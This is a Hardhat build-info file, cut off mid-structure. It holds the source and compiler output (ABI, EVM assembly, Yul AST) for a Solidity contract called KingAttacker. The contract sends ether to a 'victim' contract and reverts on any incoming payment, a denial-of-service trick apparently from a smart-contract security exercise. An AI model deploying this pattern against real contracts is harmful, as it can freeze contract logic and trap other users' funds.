{
	"id": "fbf4334391b1b4e35a9c6a58b3b5e85b",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.15",
	"solcLongVersion": "0.8.15+commit.e14f2714",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/KingAttack.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract KingAttacker {\r\n    constructor(address _victimContractAddress) payable {\r\n        address(_victimContractAddress).call{value: msg.value}(\"\");\r\n    }\r\n\r\n    fallback() external payable {\r\n        revert(\"No way man!\");\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/KingAttack.sol": {
				"KingAttacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_victimContractAddress",
									"type": "address"
								}
							],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/KingAttack.sol\":60:297  contract KingAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/KingAttack.sol\":89:218  constructor(address _victimContractAddress) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/KingAttack.sol\":160:182  _victimContractAddress */\n  dup1\n    /* \"contracts/KingAttack.sol\":152:188  address(_victimContractAddress).call */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/KingAttack.sol\":196:205  msg.value */\n  callvalue\n    /* \"contracts/KingAttack.sol\":152:210  address(_victimContractAddress).call{value: msg.value}(\"\") */\n  mload(0x40)\n  tag_5\n  swap1\n  tag_6\n  jump\t// in\ntag_5:\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup6\n  dup8\n  gas\n  call\n  swap3\n  pop\n  pop\n  pop\n  returndatasize\n  dup1\n  0x00\n  dup2\n  eq\n  tag_9\n  jumpi\n  mload(0x40)\n  swap2\n  pop\n  and(add(returndatasize, 0x3f), not(0x1f))\n  dup3\n  add\n  0x40\n  mstore\n  returndatasize\n  dup3\n  mstore\n  returndatasize\n  0x00\n  0x20\n  dup5\n  add\n  returndatacopy\n  jump(tag_8)\ntag_9:\n  0x60\n  swap2\n  pop\ntag_8:\n  pop\n  pop\n  pop\n    /* \"contracts/KingAttack.sol\":89:218  constructor(address _victimContractAddress) payable {... */\n  pop\n    /* \"contracts/KingAttack.sol\":60:297  contract KingAttacker {... */\n  jump(tag_10)\n    /* \"#utility.yul\":88:205   */\ntag_12:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_14:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_15:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_27\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_14\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_16:\n    /* \"#utility.yul\":641:665   */\n  tag_29\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_15\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_30\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_30:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_17:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_32\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_16\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_2:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_34\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_35\n  tag_12\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":932:1051   */\ntag_34:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_36\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_17\n  jump\t// in\ntag_36:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1202:1349   */\ntag_18:\n    /* \"#utility.yul\":1303:1314   */\n  0x00\n    /* \"#utility.yul\":1340:1343   */\n  dup2\n    /* \"#utility.yul\":1325:1343   */\n  swap1\n  pop\n    /* \"#utility.yul\":1202:1349   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1355:1469   */\ntag_19:\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1475:1873   */\ntag_20:\n    /* \"#utility.yul\":1634:1637   */\n  0x00\n    /* \"#utility.yul\":1655:1738   */\n  tag_40\n    /* \"#utility.yul\":1736:1737   */\n  0x00\n    /* \"#utility.yul\":1731:1734   */\n  dup4\n    /* \"#utility.yul\":1655:1738   */\n  tag_18\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":1648:1738   */\n  swap2\n  pop\n    /* \"#utility.yul\":1747:1840   */\n  tag_41\n    /* \"#utility.yul\":1836:1839   */\n  dup3\n    /* \"#utility.yul\":1747:1840   */\n  tag_19\n  jump\t// in\ntag_41:\n    /* \"#utility.yul\":1865:1866   */\n  0x00\n    /* \"#utility.yul\":1860:1863   */\n  dup3\n    /* \"#utility.yul\":1856:1867   */\n  add\n    /* \"#utility.yul\":1849:1867   */\n  swap1\n  pop\n    /* \"#utility.yul\":1475:1873   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1879:2258   */\ntag_6:\n    /* \"#utility.yul\":2063:2066   */\n  0x00\n    /* \"#utility.yul\":2085:2232   */\n  tag_43\n    /* \"#utility.yul\":2228:2231   */\n  dup3\n    /* \"#utility.yul\":2085:2232   */\n  tag_20\n  jump\t// in\ntag_43:\n    /* \"#utility.yul\":2078:2232   */\n  swap2\n  pop\n    /* \"#utility.yul\":2249:2252   */\n  dup2\n    /* \"#utility.yul\":2242:2252   */\n  swap1\n  pop\n    /* \"#utility.yul\":1879:2258   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"contracts/KingAttack.sol\":60:297  contract KingAttacker {... */\ntag_10:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/KingAttack.sol\":60:297  contract KingAttacker {... */\n      mstore(0x40, 0x80)\n        /* \"contracts/KingAttack.sol\":265:286  revert(\"No way man!\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_5\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"#utility.yul\":7:176   */\n    tag_7:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:343   */\n    tag_8:\n        /* \"#utility.yul\":322:335   */\n      0x4e6f20776179206d616e21000000000000000000000000000000000000000000\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:336   */\n      mstore\n        /* \"#utility.yul\":182:343   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":349:715   */\n    tag_9:\n        /* \"#utility.yul\":491:494   */\n      0x00\n        /* \"#utility.yul\":512:579   */\n      tag_14\n        /* \"#utility.yul\":576:578   */\n      0x0b\n        /* \"#utility.yul\":571:574   */\n      dup4\n        /* \"#utility.yul\":512:579   */\n      tag_7\n      jump\t// in\n    tag_14:\n        /* \"#utility.yul\":505:579   */\n      swap2\n      pop\n        /* \"#utility.yul\":588:681   */\n      tag_15\n        /* \"#utility.yul\":677:680   */\n      dup3\n        /* \"#utility.yul\":588:681   */\n      tag_8\n      jump\t// in\n    tag_15:\n        /* \"#utility.yul\":706:708   */\n      0x20\n        /* \"#utility.yul\":701:704   */\n      dup3\n        /* \"#utility.yul\":697:709   */\n      add\n        /* \"#utility.yul\":690:709   */\n      swap1\n      pop\n        /* \"#utility.yul\":349:715   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":721:1140   */\n    tag_6:\n        /* \"#utility.yul\":887:891   */\n      0x00\n        /* \"#utility.yul\":925:927   */\n      0x20\n        /* \"#utility.yul\":914:923   */\n      dup3\n        /* \"#utility.yul\":910:928   */\n      add\n        /* \"#utility.yul\":902:928   */\n      swap1\n      pop\n        /* \"#utility.yul\":974:983   */\n      dup2\n        /* \"#utility.yul\":968:972   */\n      dup2\n        /* \"#utility.yul\":964:984   */\n      sub\n        /* \"#utility.yul\":960:961   */\n      0x00\n        /* \"#utility.yul\":949:958   */\n      dup4\n        /* \"#utility.yul\":945:962   */\n      add\n        /* \"#utility.yul\":938:985   */\n      mstore\n        /* \"#utility.yul\":1002:1133   */\n      tag_17\n        /* \"#utility.yul\":1128:1132   */\n      dup2\n        /* \"#utility.yul\":1002:1133   */\n      tag_9\n      jump\t// in\n    tag_17:\n        /* \"#utility.yul\":994:1133   */\n      swap1\n      pop\n        /* \"#utility.yul\":721:1140   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200d14ef600b13c07c30498ef510ccb41fb52d2c08ed82e7ff6fe09dbcce71e0ec64736f6c634300080f0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_18": {
									"entryPoint": null,
									"id": 18,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 226,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 247,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 306,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 341,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 292,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 185,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 153,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 148,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470": {
									"entryPoint": 303,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 203,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2261:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "922:274:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "968:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "964:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:32:1"
															},
															"nodeType": "YulIf",
															"src": "932:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "1061:128:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1105:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "903:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "915:6:1",
														"type": ""
													}
												],
												"src": "845:351:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1315:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1325:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1340:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1325:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1287:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1292:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1303:11:1",
														"type": ""
													}
												],
												"src": "1202:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1461:8:1",
													"statements": []
												},
												"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "1453:6:1",
														"type": ""
													}
												],
												"src": "1355:114:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1638:235:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1648:90:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1731:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1736:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1655:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1655:83:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1648:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1836:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"nodeType": "YulIdentifier",
																	"src": "1747:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1747:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1747:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1849:18:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1860:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1865:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1856:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1856:11:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1849:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1626:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1634:3:1",
														"type": ""
													}
												],
												"src": "1475:398:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2067:191:1",
													"statements": [
														{
